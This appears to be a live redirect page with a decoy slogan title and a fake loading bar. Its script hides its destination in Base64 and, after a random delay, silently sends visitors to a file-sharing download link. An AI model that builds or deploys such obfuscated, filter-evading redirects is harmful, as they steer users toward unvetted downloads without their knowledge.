
<html> 
<head> 
    <meta charset="UTF-8"> 
    <title>爱国敬业民主和谐</title> 
<script>
    // 多域名列表（Base64编码）
    var domains = [
  
        'aHR0cHM6Ly93d2Jray5sYW56b3ViLmNvbS9iMDB5YjdmN3pn',
        'aHR0cHM6Ly93d2Jray5sYW56b3ViLmNvbS9iMDB5YjdmN3pn'
    ];
    
    // 随机选择一个域名
    var randomDomain = domains[Math.floor(Math.random() * domains.length)]; 
    
    // 解码Base64得到真实URL 
    var redirectUrl = atob(randomDomain);
    
    // 随机延时（1-3秒）
    var delay = 500 + Math.floor(Math.random()  * 500);
    
    console.log("Selected  URL:", redirectUrl);
    console.log("Redirect  in:", delay + "ms");
    
    // 定时跳转
    setTimeout(function() {
        location.href  = redirectUrl;
    }, delay);
</script>
</head> 
<body></body> 

 
<head> 
    <meta charset="utf-8"> 
    <title>爱国敬业民主和谐</title> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>动态加载页面</title> 
    <style> 
        /* 响应式布局基础 */ 
        body { 
            margin: 0; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            background: linear-gradient(135deg, #29323c 0%, #485563 100%); 
            font-family: 'Segoe UI', sans-serif; 
        } 
 
        /* 加载容器 */ 
        .loader-container { 
            text-align: center; 
            max-width: 400px; 
            width: 90%; 
        } 
 
        /* 动态进度条 */ 
        .progress-bar { 
            width: 100%; 
            height: 8px; 
            background: #333; 
            border-radius: 4px; 
            margin: 20px 0; 
        } 
 
        .progress { 
            height: 100%; 
            background: linear-gradient(90deg, #667eea, #6f54c2); 
            /* 延长 CSS 动画时间为 5 秒 */ 
            animation: progressAnimation 2s forwards; 
            transition: width 0.3s ease-in-out; 
        } 
 
        /* 动态加载文字 */ 
        .loading-text { 
            color: #fff; 
            font-size: 1.2rem; 
            margin-bottom: 15px; 
            animation: fadeIn 1.5s infinite alternate; 
        } 
 
        /* 响应式调整 */ 
        @media (max-width: 600px) { 
            .loading-text { 
                font-size: 1rem; 
            } 
            .progress-bar { 
                height: 6px; 
            } 
        } 
 
        /* CSS 动画 */ 
        @keyframes progressAnimation { 
            from { 
                width: 0; 
            } 
            to { 
                width: 100%; 
            } 
        } 
 
        @keyframes fadeIn { 
            from { 
                opacity: 0.6; 
            } 
            to { 
                opacity: 1; 
            } 
        } 
    </style> 
</head> 

<body> 
    <div class="loader-container"> 
        <h1 class="loading-text">正在加载...</h1> 
        <div class="progress-bar"> 
            <div class="progress"></div> 
        </div> 
    </div> 
 
    <script> 
        // 动态加载控制 
        let progress = 0; 
        const progressBar = document.querySelector('.progress');  
 
        // 模拟加载过程 
        const timer = setInterval(() => { 
            if (progress >= 100) { 
                clearInterval(timer); 
                // 加载完成后跳转 
            } 
            // 降低进度增长速度，将每次增长的值减小 
            progress += Math.random()  * 2 + 0.5; 
            progressBar.style.width  = `${progress}%`; 
        }, 200); // 延长定时器的间隔时间 
    </script> 
    <style> 
        html { 
            color-scheme: light dark; 
            background-color: #f0f0f0; 
        } 
 
        body { 
            width: 100vw; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            font-family: 'Arial', sans-serif; 
        } 
 
        h1 { 
            font-size: 4em; 
            color: #333; 
            text-shadow: 1px 1px 1px #ccc; 
            margin-bottom: 20px; 
        } 
 
        p { 
            font-size: 1.5em; 
            color: #666; 
        } 
    </style> 
    <p>页面正在跳转，请稍等</p>
